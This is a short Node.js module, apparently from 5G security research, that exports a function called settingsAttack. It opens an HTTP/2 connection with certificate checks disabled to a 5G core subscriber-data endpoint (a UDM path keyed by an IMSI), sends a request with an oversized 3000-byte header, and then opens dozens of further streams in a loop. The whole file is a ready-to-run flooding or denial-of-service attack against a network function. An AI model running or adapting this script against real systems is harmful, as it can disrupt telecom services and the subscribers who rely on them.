const http2 = require('http2');

function settingsAttack(ip, port){
  let address= 'https://'.concat(ip).concat(':').concat(port).concat('/');

  const client = http2.connect(address,{
          requestCert: false, // put true if you want a client certificate, tested and it works
          rejectUnauthorized: false
  });

  // Set the maximum values for MAX_CONCURRENT_STREAMS and INITIAL_WINDOW_SIZE
  client.settings.maxConcurrentStreams =100;
  client.settings.initialWindowSize = 65535;

  const path = `/nudm-sdm/v2/imsi-460020301001001?dataset-names=AM,SMF_SEL}`;
  // Send a GET request with a long header field on stream 1
  const headers = {
    ':method': 'GET',
    ':path': path,
    'custom-header': 'a'.repeat(3000)
  };
  const stream = client.request(headers, { endStream: false, id: 1 });

  stream.end();


  // Send multiple requests on odd-numbered streams
  for (let i = 3; i < 100; i += 2) {
    console.log("RIchiesta ",i);
    const requestHeaders = {
      ':method': 'GET',
      ':path': path,
      ':scheme': 'https'
    };
    const requestStream = client.request(requestHeaders, { endStream: false, id: i });
    requestStream.end();
  }


}
module.exports = settingsAttack;
